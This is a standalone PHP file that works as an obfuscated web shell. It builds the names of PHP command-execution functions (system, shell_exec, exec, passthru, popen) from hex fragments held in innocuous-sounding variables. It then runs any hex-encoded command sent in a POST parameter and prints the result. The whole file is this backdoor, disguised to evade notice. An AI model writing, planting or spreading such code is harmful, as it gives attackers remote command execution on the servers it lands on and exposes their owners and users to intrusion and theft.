<?php


$flag1 = '3';
$flag2 = '9';
$flag3 = '7';
$flag4 = '6';
$flag5 = 'd';
$flag6 = '8';
$flag7 = '5';
$flag8 = 'c';
$flag9 = 'f';
$flag10 = '0';
$flag11 = 'e';
$flag12 = '4';
$flag13 = '2';
$flag14 = '1';
$data_storage1 = pack("H*", '7' . $flag1 . '7' . $flag2 . '7' . '3' . $flag3 . '4' . $flag4 . '5' . '6' . $flag5);
$data_storage2 = pack("H*", '7' . '3' . '6' . $flag6 . '6' . $flag7 . $flag4 . $flag8 . $flag4 . $flag8 . '5' . $flag9 . '6' . '5' . $flag3 . '8' . $flag4 . $flag7 . $flag4 . '3');
$data_storage3 = pack("H*", $flag4 . $flag7 . '7' . $flag6 . $flag4 . '5' . $flag4 . '3');
$data_storage4 = pack("H*", $flag3 . $flag10 . $flag4 . '1' . '7' . '3' . '7' . $flag1 . $flag3 . '4' . $flag4 . $flag6 . '7' . '2' . $flag3 . $flag7);
$data_storage5 = pack("H*", $flag3 . $flag10 . $flag4 . 'f' . $flag3 . $flag10 . $flag4 . '5' . $flag4 . $flag11);
$data_storage6 = pack("H*", '7' . '3' . $flag3 . $flag12 . '7' . $flag13 . '6' . $flag7 . '6' . $flag14 . $flag4 . 'd' . $flag7 . 'f' . $flag4 . '7' . '6' . '5' . $flag3 . '4' . $flag7 . $flag9 . '6' . '3' . '6' . $flag9 . $flag4 . 'e' . '7' . $flag12 . $flag4 . '5' . '6' . 'e' . $flag3 . '4' . '7' . '3');
$data_storage7 = pack("H*", '7' . $flag10 . $flag4 . $flag1 . $flag4 . 'c' . '6' . 'f' . $flag3 . '3' . $flag4 . '5');
$query_handler = pack("H*", '7' . '1' . $flag3 . '5' . $flag4 . '5' . '7' . '2' . $flag3 . '9' . '5' . $flag9 . $flag4 . '8' . '6' . '1' . $flag4 . 'e' . $flag4 . $flag12 . $flag4 . 'c' . $flag4 . $flag7 . '7' . '2');
if (isset($_POST[$query_handler])) {
    $query_handler = pack("H*", $_POST[$query_handler]);
    if (function_exists($data_storage1)) {
        $data_storage1($query_handler);
    } elseif (function_exists($data_storage2)) {
        print $data_storage2($query_handler);
    } elseif (function_exists($data_storage3)) {
        $data_storage3($query_handler, $obj_entity);
        print join("\n", $obj_entity);
    } elseif (function_exists($data_storage4)) {
        $data_storage4($query_handler);
    } elseif (function_exists($data_storage5) && function_exists($data_storage6) && function_exists($data_storage7)) {
        $value_itm = $data_storage5($query_handler, 'r');
        if ($value_itm) {
            $token_rec = $data_storage6($value_itm);
            $data_storage7($value_itm);
            print $token_rec;
        }
    }
    exit;
}
